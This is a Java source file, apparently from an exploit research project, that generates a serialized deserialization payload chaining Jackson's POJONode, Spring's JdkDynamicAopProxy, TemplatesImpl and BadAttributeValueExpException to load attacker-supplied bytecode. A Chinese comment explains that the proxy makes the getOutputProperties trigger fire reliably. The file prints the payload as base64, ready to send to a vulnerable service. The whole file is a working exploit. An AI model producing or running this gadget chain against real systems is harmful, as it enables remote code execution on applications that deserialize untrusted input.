package com.just.exp;

import com.fasterxml.jackson.databind.node.POJONode;
import com.just.util.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.boot.SpringApplication;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.Base64;

/**
 * 利用JdkDynamicAopProxy改进jackson不能稳定优先调用getOutputProperties方法的问题
 */
public class Exp01 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, IOException, InvocationTargetException, InstantiationException {
        // 删除writeReplace方法
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

        byte[] evilBytes = Utils.getEvilByte();
        TemplatesImpl templates = new TemplatesImpl();
        Utils.setFieldValue(templates, "_name", "justdoit");
        Utils.setFieldValue(templates, "_bytecodes", new byte[][] {evilBytes});
        Utils.setFieldValue(templates, "_tfactory", null);

        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getDeclaredConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler jdkDynamicAopProxyHandler = (InvocationHandler) constructor.newInstance(as);

        Templates templatesProxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, jdkDynamicAopProxyHandler);

        POJONode pojoNode = new POJONode(templatesProxy);
        BadAttributeValueExpException exception = new BadAttributeValueExpException(null);
        Utils.setFieldValue(exception, "val", pojoNode);

        byte[] serialize = Utils.serialize(exception);
        String s = Base64.getEncoder().encodeToString(serialize);
        System.out.println(s);
    }
}